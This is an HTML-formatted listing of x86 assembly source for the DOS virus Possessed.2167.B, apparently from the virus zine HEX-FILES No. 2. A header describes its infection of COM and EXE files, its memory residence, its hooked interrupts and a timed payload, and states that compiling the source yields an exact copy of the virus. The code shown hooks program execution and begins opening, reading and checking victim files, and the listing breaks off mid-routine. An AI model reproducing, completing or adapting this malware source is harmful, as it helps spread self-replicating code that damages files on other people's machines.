<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>pos2167b.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;   HEX-FILES No. 2                                                   File 004 </span><span class="sc0">
</span><span class="sc1">;  ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  Virus:         Possessed.2167.B</span><span class="sc0">
</span><span class="sc1">;  Alias:         Possessed 1.02A, Possessed I</span><span class="sc0">
</span><span class="sc1">;  Targets:       COM, EXE</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  Resident:      Low Memory TSR</span><span class="sc0">
</span><span class="sc1">;  MemorySize:    2672 bytes</span><span class="sc0">
</span><span class="sc1">;  MemorySelfRec: [0:1EC] &lt;&gt; 0</span><span class="sc0">
</span><span class="sc1">;  IntHooked:     21/4B00, 8</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  VirusLength:   2167 bytes</span><span class="sc0">
</span><span class="sc1">;  InfectiveLength:</span><span class="sc0">
</span><span class="sc1">;                 COM: 2167 + 26 byte host restorer</span><span class="sc0">
</span><span class="sc1">;                 EXE: 2167 + 15 byte paragraph alignment</span><span class="sc0">
</span><span class="sc1">;  LocationVirusOnFile:</span><span class="sc0">
</span><span class="sc1">;                 COM: Beginning of file; host restorer appended at end of file</span><span class="sc0">
</span><span class="sc1">;                 EXE: End of file</span><span class="sc0">
</span><span class="sc1">;  FileSelfRec:</span><span class="sc0">
</span><span class="sc1">;                 COM: File[0..65] = Virus[0..65]</span><span class="sc0">
</span><span class="sc1">;                 EXE: File[18..19] = 70h 19h</span><span class="sc0">
</span><span class="sc1">;  ReadableText:</span><span class="sc0">
</span><span class="sc1">;                 "POSSESSED! Bwa! ha! ha! ha! ha!$</span><span class="sc0">
</span><span class="sc1">;                  Author: JonJon Gumba of AdU"</span><span class="sc0">
</span><span class="sc1">;  EncryptedText:</span><span class="sc0">
</span><span class="sc1">;                 "JonJon Gumba", "COMMAND.COM", "Fuck Off"</span><span class="sc0">
</span><span class="sc1">;  DisplayedText:</span><span class="sc0">
</span><span class="sc1">;                 1) If ReadableTextNameAuthor &lt;&gt; EncryptedTextNameAuthor</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;                           "Fuck Off"</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;                 2) If host program EXEC failed</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;                           "POSSESSED! Bwa! ha! ha! ha! ha!"</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  Payload:        Flashing face</span><span class="sc0">
</span><span class="sc1">;  PayloadTrigger: 2 hours after going resident</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  ฤฤ POS2167B.ASM STARTS HERE ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ </span><span class="sc0">
 
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING                                                 WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING      destructive codes  intentional damage      WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING                 deletes files                   WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING                                                 WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; Virus:  Possessed.2167.B</span><span class="sc0">
 </span><span class="sc1">; Alias:  Possessed 1.02A, Possessed I</span><span class="sc0">
 </span><span class="sc1">; Author: JonJon Gumba</span><span class="sc0">
 </span><span class="sc1">; Origin: Adamson University, Manila, Philippines</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; This source code is written in a way so that when compiled you will </span><span class="sc0">
 </span><span class="sc1">; get an exact copy of the virus. </span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; You will only be able to duplicate the original virus if you use </span><span class="sc0">
 </span><span class="sc1">; *TASM 2.01* or *MASM 5.0* to compile this program listing. Other </span><span class="sc0">
 </span><span class="sc1">; compilers or versions of a compiler might produce a virus different </span><span class="sc0">
 </span><span class="sc1">; from that originally released.</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; This can also be compiled in a86 4.02 but you will be creating a </span><span class="sc0">
 </span><span class="sc1">; new variant.</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; Compile to COM.</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; Program listing created by Putoksa Kawayan.        HEX-FILES No. 2</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">ExeHeader</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc5">isExeId</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isMod</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isBlocks</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isRelocItemCt</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isHeaderSize</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isMinAlloc</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isMaxAlloc</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isSs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isSp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isCxSum</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isIp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isCs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeHeader</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0"> 
 
 </span><span class="sc5">Possessed</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc0">
 
 </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 
 </span><span class="sc5">MemoryMarkerLoc</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01ech</span><span class="sc0">
 </span><span class="sc5">SaveSsOnInt21</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01f6h</span><span class="sc0">
 </span><span class="sc5">SaveSpOnInt21</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01f4h</span><span class="sc0">
 
 </span><span class="sc5">PossessedEntry</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ComEntry</span><span class="sc0">
       
 </span><span class="sc5">PossessedId</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc12">'POSSESSED! Bwa! ha! ha! ha! ha!$'</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc12">'Author: '</span><span class="sc0">
 </span><span class="sc5">Author</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'JonJon Gumba of AdU'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc0">
 
 </span><span class="sc5">isDos</span><span class="sc4">:</span><span class="sc0">  
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosHandler</span><span class="sc0">
 
 </span><span class="sc5">DosVersion</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">FirstGenerationFlag</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
 
 </span><span class="sc5">DosInterrupt</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
   </span><span class="sc5">DosIntOffset</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">DosIntSegment</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">ClockInterrupt</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
   </span><span class="sc5">ClockIntOffset</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">ClockIntSegment</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">ErrorIntOffset</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ErrorIntSegment</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">VictimAsciizSegment</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">VictimAsciizOffset</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Attribute</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Handle</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">FileTime</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">FileDate</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ComLength</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">ExecuteVictimComFromEof</span><span class="sc4">-</span><span class="sc5">VictimCode</span><span class="sc0">
 </span><span class="sc5">AllocatedMemory</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Timer</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Hour</span><span class="sc0">                    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ViruSs</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ViruSp</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeSs</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeSp</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeCs</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeIp</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">ExecuteExeVictim</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
   </span><span class="sc5">ExeVictimOffset</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">ExeVictimSegment</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">VirusJumper</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
   </span><span class="sc5">VirusJumperOffset</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">VirusJumperSegment</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">ExeLengthLo</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeLengthHi</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Environment</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Psp</span><span class="sc0">                     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">DosHandler</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">PassToDos</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SetToInfect</span><span class="sc0">
 </span><span class="sc5">RestoreRegisters</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc5">PassToDos</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosInterrupt</span><span class="sc0">
 
 </span><span class="sc5">SetToInfect</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">VictimAsciizSegment</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">VictimAsciizOffset</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc5">CheckIfPathSeparator</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CheckIfEndOfFileName</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CheckNextCharOfFileName</span><span class="sc0">
 </span><span class="sc5">CheckIfEndOfFileName</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EndOfFileName</span><span class="sc0">
 </span><span class="sc5">CheckNextCharOfFileName</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CheckIfPathSeparator</span><span class="sc0">
 
 </span><span class="sc5">RestoreErrorInterrupt</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ErrorIntOffset</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">ErrorIntSegment</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RestoreRegisters</span><span class="sc0">
 
 </span><span class="sc5">EndOfFileName</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameOfVictim</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc0">
 
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ErrorIntSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ErrorIntOffset</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isError</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
 </span><span class="sc5">Relay1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RestoreErrorInterrupt</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Attribute</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Handle</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileDate</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileTime</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">EnoughMemory</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay2</span><span class="sc0">
 </span><span class="sc5">EnoughMemory</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">AllocatedMemory</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
 </span><span class="sc5">Relay2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay3</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ComLength</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MovePointerBegin</span><span class="sc0">
 </span><span class="sc5">Relay3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">AllocatedMemory</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
 </span><span class="sc5">Relay4</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">DoneWithFile</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ComInfectCheck</span><span class="sc0">
